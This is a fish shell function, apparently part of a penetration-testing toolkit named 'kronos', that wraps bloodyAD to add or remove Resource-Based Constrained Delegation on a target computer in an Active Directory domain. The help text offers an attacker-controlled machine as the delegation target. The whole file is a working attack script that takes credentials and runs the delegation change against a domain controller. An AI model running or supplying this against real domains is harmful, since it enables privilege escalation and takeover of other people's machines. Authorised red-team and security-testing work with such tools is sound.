# description: Resource-Based Constrained Delegation (RBCD) attack
function __kronos_rbcd --description "Resource-Based Constrained Delegation (RBCD) attack"
    argparse h/help u/username= p/password= k/kerberos t/target-computer= m/delegate-to= a/action= -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos rbcd [TARGET_DC] [OPTIONS]"
        echo ""
        echo "Perform RBCD attack (add/remove delegation) using bloodyAD."
        echo ""
        echo "Options:"
        echo "  -t, --target-computer NAME Computer to attack (e.g. 'web01')"
        echo "  -m, --delegate-to NAME     Computer to delegate to (e.g. 'attacker-pc\$')"
        echo "  -a, --action ACTION        Action (add, remove) - default: add"
        echo "  -u, --username USER        Auth username"
        echo "  -p, --password PASS        Auth password"
        echo "  -k, --kerberos             Use Kerberos authentication"
        echo "  -h, --help                 Show this help message"
        return 0
    end

    set -l target $argv[1]
    if test -z "$target"; set target $TGT_DC_IP; end
    if test -z "$target"; set target $TGT_DC; end
    if test -z "$target"; set target $TGT; end
    if test -z "$target"
        echo "error: target DC is required" >&2
        return 1
    end

    if not set -q _flag_target_computer; or not set -q _flag_delegate_to
        echo "error: --target-computer and --delegate-to are required" >&2
        return 1
    end

    set -l action "add"
    if test "$_flag_action" = "remove"; set action "remove"; end

    set -l domain $TGT_DC_DOMAIN
    if test -z "$domain"
        echo "error: \$TGT_DC_DOMAIN is not set" >&2
        return 1
    end

    set -l cmd_str bloodyAD --host "$target" -d "$domain"
    if set -q _flag_kerberos
        set -a cmd_str -k
    else
        set -l auth_user $_flag_username; if test -z "$auth_user"; set auth_user $TGT_USERNAME; end
        if test -z "$auth_user"; set auth_user $TGT_CRED_USERNAME; end

        set -l auth_pass $_flag_password; if test -z "$auth_pass"; set auth_pass $TGT_PASSWORD; end
        if test -z "$auth_pass"; set auth_pass $TGT_CRED_PASSWORD; end

        if test -z "$auth_user"
            echo "error: auth credentials required" >&2
            return 1
        end
        set -a cmd_str -u "$auth_user" -p "$auth_pass"
    end

    set -a cmd_str $action rbcd "$_flag_target_computer" "$_flag_delegate_to"

    __kronos_check_dep bloodyAD; or return 1

    echo "[*] Performing RBCD $action on $_flag_target_computer for $_flag_delegate_to..."
    command $cmd_str
end
